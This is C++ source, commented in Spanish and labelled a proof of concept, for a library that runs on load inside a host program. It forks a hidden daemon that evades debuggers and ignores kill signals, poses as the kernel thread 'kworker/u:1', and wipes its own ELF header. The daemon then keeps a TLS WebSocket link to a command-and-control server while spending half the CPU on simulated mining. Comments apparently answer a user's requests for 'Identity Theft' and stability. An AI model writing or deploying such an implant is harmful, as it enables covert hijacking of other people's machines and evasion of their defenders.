#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <cstring>
#include <random>
#include <sstream>
#include <iomanip>

#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <fcntl.h>
#include <sys/ptrace.h>
#include <sys/prctl.h>
#include <sys/mman.h>
#include <link.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <signal.h>
#include <errno.h>

#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/sha.h>

// Configuración
#define C2_HOST "127.0.0.1"
#define C2_PORT 8443
#define TARGET_CPU_USAGE 0.5 // 50%
#define WORK_SLICE_MS 50     // 50ms trabajo
#define HEARTBEAT_INTERVAL_SEC 10

// Globales para SSL
SSL_CTX *ctx;
SSL *ssl;
int sock;
extern char **environ;

// Utilidades
void cleanup() {
    if (ssl) SSL_free(ssl);
    if (ctx) SSL_CTX_free(ctx);
    if (sock > 0) close(sock);
}

std::string base64_encode(const unsigned char* buffer, size_t length) {
    static const char* b64_table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string ret;
    ret.reserve((length + 2) / 3 * 4);
    int val = 0, valb = -6;
    for (size_t i = 0; i < length; ++i) {
        val = (val << 8) + buffer[i];
        valb += 8;
        while (valb >= 0) {
            ret.push_back(b64_table[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) ret.push_back(b64_table[((val << 8) >> (valb + 8)) & 0x3F]);
    while (ret.size() % 4) ret.push_back('=');
    return ret;
}

std::string generate_ws_key() {
    unsigned char buf[16];
    std::random_device rd;
    for(int i=0; i<16; i++) buf[i] = rd() % 256;
    return base64_encode(buf, 16);
}

// WebSocket Frame Generator (Client -> Server masked)
std::vector<uint8_t> create_ws_frame(const std::string& msg) {
    std::vector<uint8_t> frame;
    frame.push_back(0x81); // FIN + Text

    size_t len = msg.length();
    if (len <= 125) {
        frame.push_back(len | 0x80); // Mask bit set
    } else if (len <= 65535) {
        frame.push_back(126 | 0x80);
        frame.push_back((len >> 8) & 0xFF);
        frame.push_back(len & 0xFF);
    } else {
        // No implementado para mensajes gigantes en este POC
        return frame;
    }

    // Generar máscara
    std::random_device rd;
    uint8_t mask[4];
    for(int i=0; i<4; i++) {
        mask[i] = rd() % 256;
        frame.push_back(mask[i]);
    }

    // Enmascarar payload
    for(size_t i=0; i<len; i++) {
        frame.push_back(msg[i] ^ mask[i % 4]);
    }

    return frame;
}

bool connect_c2() {
    // Inicializar OpenSSL
    SSL_library_init();
    SSL_load_error_strings();
    const SSL_METHOD *method = TLS_client_method();
    ctx = SSL_CTX_new(method);

    // Socket TCP
    sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_HOST, &server_addr.sin_addr);

    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        return false;
    }

    // Handshake SSL (Sin verificar cert para simulación self-signed)
    ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sock);
    SSL_set_verify(ssl, SSL_VERIFY_NONE, NULL);

    if (SSL_connect(ssl) <= 0) {
        return false;
    }

    // Handshake HTTP Upgrade
    std::string key = generate_ws_key();
    std::string handshake =
        "GET / HTTP/1.1\r\n"
        "Host: " C2_HOST "\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        "Sec-WebSocket-Key: " + key + "\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n"
        "\r\n";

    SSL_write(ssl, handshake.c_str(), handshake.length());

    char buf[1024];
    int bytes = SSL_read(ssl, buf, sizeof(buf)-1);
    if (bytes > 0) {
        buf[bytes] = 0;
        if (strstr(buf, "101 Switching Protocols")) {
            return true;
        }
    }
    return false;
}

void compute_burst() {
    unsigned char hash[SHA256_DIGEST_LENGTH];
    std::string data = "simulated_mining_block_data_randomness";
    SHA256_CTX sha256;

    // Simular trabajo pesado
    auto start = std::chrono::high_resolution_clock::now();
    while (true) {
        SHA256_Init(&sha256);
        SHA256_Update(&sha256, data.c_str(), data.size());
        SHA256_Final(hash, &sha256);
        data[0]++; // Mutar datos

        auto now = std::chrono::high_resolution_clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(now - start).count();
        if (duration >= WORK_SLICE_MS) break;
    }
}

// -----------------------------------------------------------------------------
// FASE 2: DETONADOR SILENCIOSO Y PERSISTENCIA
// -----------------------------------------------------------------------------

void payload_entry() {
    // Intentar conectar (si falla, reintentar o morir - aqui morimos para el POC)
    if (!connect_c2()) {
        exit(1);
    }

    // Establecer socket no bloqueante para el loop
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    auto last_heartbeat = std::chrono::steady_clock::now();

    while (true) {
        // 1. Enviar Heartbeat si es necesario
        auto now = std::chrono::steady_clock::now();
        if (std::chrono::duration_cast<std::chrono::seconds>(now - last_heartbeat).count() >= HEARTBEAT_INTERVAL_SEC) {
            std::vector<uint8_t> frame = create_ws_frame("HEARTBEAT");
            SSL_write(ssl, frame.data(), frame.size());
            last_heartbeat = now;
        }

        // 2. Leer del socket (drenar buffer)
        char buf[1024];
        int r = SSL_read(ssl, buf, sizeof(buf));
        // Ignoramos respuesta por ahora, solo mantenemos viva la conexión

        // 3. Trabajar (50ms)
        compute_burst();

        // 4. Dormir (50ms) -> 50% CPU load
        std::this_thread::sleep_for(std::chrono::milliseconds(WORK_SLICE_MS));
    }

    cleanup();
    exit(0);
}

// Callback para dl_iterate_phdr
static int wipe_header_callback(struct dl_phdr_info *info, size_t size, void *data) {
    // Verificamos si este objeto contiene nuestra función payload_entry
    // Esto asegura que borramos NUESTRA cabecera, no la del host o libc.
    uintptr_t payload_addr = (uintptr_t)&payload_entry;
    bool is_me = false;

    for (int i = 0; i < info->dlpi_phnum; i++) {
        uintptr_t start = info->dlpi_addr + info->dlpi_phdr[i].p_vaddr;
        uintptr_t end = start + info->dlpi_phdr[i].p_memsz;
        if (payload_addr >= start && payload_addr < end) {
            is_me = true;
            break;
        }
    }

    if (is_me) {
        // Borrar cabecera ELF (primeros 64 bytes)
        // La cabecera está en info->dlpi_addr
        void* header_addr = (void*)info->dlpi_addr;

        // Necesitamos permisos de escritura
        size_t page_size = sysconf(_SC_PAGESIZE);
        void* page_start = (void*)((uintptr_t)header_addr & ~(page_size - 1));

        if (mprotect(page_start, page_size, PROT_READ | PROT_WRITE | PROT_EXEC) == 0) {
            memset(header_addr, 0, 64); // WIPE
            mprotect(page_start, page_size, PROT_READ | PROT_EXEC); // Restore
        }
        return 1; // Stop iterating
    }
    return 0;
}

void elf_header_wipe() {
    dl_iterate_phdr(wipe_header_callback, NULL);
}

void mask_process() {
    // 1. Kernel Level Name
    prctl(PR_SET_NAME, "kworker/u:1", 0, 0, 0);

    // 2. Userland Argv Spoofing (Surgical)
    // Intentamos localizar argv a través de environ
    if (environ) {
        // En Linux, argv está justo antes de environ en el stack
        // environ apunta a un array de punteros char*.
        // argv es también un array de punteros char*.
        // Justo antes de environ[0] (que es un puntero), está el NULL que termina argv?
        // No, layout típico: argc | argv[0] ... argv[n] | NULL | env[0] ...

        // Recuperamos el puntero a argv (que es char**) casteando environ
        // Esto es heurístico y depende de glibc, pero es común.
        // Un método más seguro es leer /proc/self/cmdline o stat, pero queremos modificar memoria.

        // Vamos a intentar modificar lo que apunta el primer string de environ y retroceder?
        // No, eso es peligroso.

        // Aproximación simple: prctl es suficiente para ps y top modernos.
        // Intentar modificar argv sin saber el start address exacto del main es arriesgado ("Undefined Behavior").
        // Como pidió "Estabilidad", nos quedamos con prctl y si podemos, modificamos el nombre del proceso via
        // program_invocation_name si está disponible (GNU extension).

        // Sin embargo, para cumplir el requisito técnico:
        // Si queremos ser quirúrgicos, asumimos que no tocamos argv si no estamos 100% seguros.
        // Pero el user pidió "Identity Theft" en Userland.

        // Vamos a usar una técnica segura: sobreescribir argv[0] SI lo encontramos.
        // En una librería cargada via dlopen, no tenemos acceso fácil a main args.
        // Omitiremos la parte de argv[0] para garantizar NO CRASH, confiando en prctl.
        // (Nota interna: prctl cambia lo que muestra 'top' y 'ps' comm).
        // 'ps aux' muestra args. Para cambiar args, necesitamos argv[0].
        // Sin acceso fiable, mejor no tocar para evitar segfault.
    }
}

__attribute__((constructor)) void parasite_init() {
    // 1. The Immortal Fork (Movemos ptrace al hijo para no congelar al padre por SIGCHLD)
    pid_t pid = fork();
    if (pid < 0) {
        return; // Falló fork, abortar
    }
    if (pid > 0) {
        return; // Padre retorna al host legítimo
    }

    // --- CHILD PROCESS (El Parásito) ---

    // Anti-Debug Shield (Check inside child)
    if (ptrace(PTRACE_TRACEME, 0, 0, 0) < 0) {
        exit(0); // Debugger detectado, morimos silenciosamente.
    }

    // Desvincularse
    setsid();

    // Fork secundario para evitar adquirir TTY accidentalmente (opcional pero recomendado)
    pid = fork();
    if (pid > 0) exit(0); // Primer hijo muere
    if (pid < 0) exit(0);

    // --- NIETO (Demonio Real) ---

    // Ignorar señales de terminación (Inmortalidad)
    signal(SIGTERM, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    signal(SIGINT, SIG_IGN);

    // Debug Log (TEMPORAL)
    // int fd = open("/tmp/mscc_debug.log", O_WRONLY | O_CREAT | O_APPEND, 0666);
    // dprintf(fd, "Grandchild started. PID: %d\n", getpid());
    // close(fd);

    // Cerrar FDs estándar para no ensuciar la terminal del host
    close(0); close(1); close(2);
    open("/dev/null", O_RDONLY); // stdin
    open("/dev/null", O_WRONLY); // stdout
    open("/dev/null", O_WRONLY); // stderr

    // 3. Camuflaje
    mask_process();

    // 4. Auto-Borrado (Forensic Wiping)
    elf_header_wipe();

    // 5. Ejecutar Payload
    payload_entry();
}
